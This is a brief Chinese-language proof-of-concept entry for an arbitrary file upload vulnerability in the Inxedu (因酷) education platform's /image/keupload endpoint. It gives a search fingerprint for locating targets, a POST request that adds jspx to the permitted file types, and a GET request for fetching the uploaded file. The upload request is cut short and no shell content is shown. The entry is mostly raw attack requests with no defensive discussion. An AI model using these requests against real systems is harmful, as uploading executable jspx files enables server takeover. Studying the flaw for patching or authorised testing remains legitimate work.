# 因酷教育平台keupload任意文件上传漏洞

- **系统**：因酷教育平台keupload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/image/keupload?"`
- **请求**：`POST /image/keupload?param=image&fileType=jpg,gif,png,jpeg,jspx HTTP/1.1   Host:    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8   A`

**请求体 / payload**
```
访问返回的地址
GET /images/upload/image/20250909/1757387007337.jspx HTTP/1.1   Host:    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   Accept-Encoding: gzip, deflate, br, zstd
```
- **预期**：200　|　暂无
##